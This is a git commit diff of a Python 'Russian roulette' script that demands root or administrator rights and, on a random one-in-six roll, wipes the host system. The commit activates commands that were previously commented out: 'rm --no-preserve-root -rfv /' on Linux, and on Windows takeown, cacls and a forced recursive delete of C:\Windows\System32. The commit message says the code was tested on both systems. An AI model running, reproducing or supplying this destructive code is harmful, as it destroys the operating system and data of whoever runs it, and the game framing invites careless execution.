4af1a52a6da26d8c58ddf4ec35a6b04210918e98
seymouslee <mlpsxsl@gmail.com>
2022-05-14 17:21:33 +0800

    code tested on both windows and linux

--- russian_roulette.py
+++ russian_roulette.py
@@ -29,38 +29,43 @@ def input_trigger():
 
 
 def check_os():
-    if os.name == 'posix' and os.environ.get("SUDO_UID") and os.geteuid() == 0:
-            return
-    elif os.name == 'nt' and ctypes.windll.shell32.IsUserAnAdmin() == 0:
-            return
-    print("[Error] You need to run this script with sudo or as root.")
-    sys.exit()
-    
+    try:
+        is_admin = os.getuid() == 0
+    except AttributeError:
+        is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
+    if not is_admin:
+        print("[Error] You need to run this script with sudo or as root.")
+        sys.exit()
+
 
 def destroy_os():
     print(os.name)
     if os.name == 'nt':
-        # os.system('takeown /f C:\Windows\System32')
-        # os.system('cacls C:\Windows\System32')
-        # os.system('rmdir C:\Windows\System32')
+        os.system('takeown /f C:\Windows\System32')
+        os.system('cacls C:\Windows\System32')
+        os.system('Del /s /q /f C:\Windows\System32')
         pass
     elif os.name == 'posix':
-        # os.system('rm --no-preserve-root -rfv /')
+        os.system('rm --no-preserve-root -rfv /')
         pass
+    pass
 
+if __name__ == "__main__":
 
-trigger:int = 0
-os_type:str = ""
-print(banner)
-check_os()
+    trigger:int = 0
+    os_type:str = ""
+    print(banner)
+    check_os()
 
-while True:
-    trigger = input_trigger()
-    bullet = randint(1,6)
-    if trigger == bullet:
-        print("goodbye! :)")
-        destroy_os()
-    else:
-        print("You got lucky this time :))")
-        trigger = str(input("Continue? [y/n]: "))
-        if trigger == "n": sys.exit()
+    while True:
+        trigger = input_trigger()
+        bullet = randint(1,6)
+        if trigger == bullet:
+            print("goodbye! :)")
+            destroy_os()
+        else:
+            print("You got lucky this time :))")
+            while True:
+                trigger = str(input("Continue? [y/n]: "))
+                if trigger == "n": sys.exit()
+                if trigger == "y": break
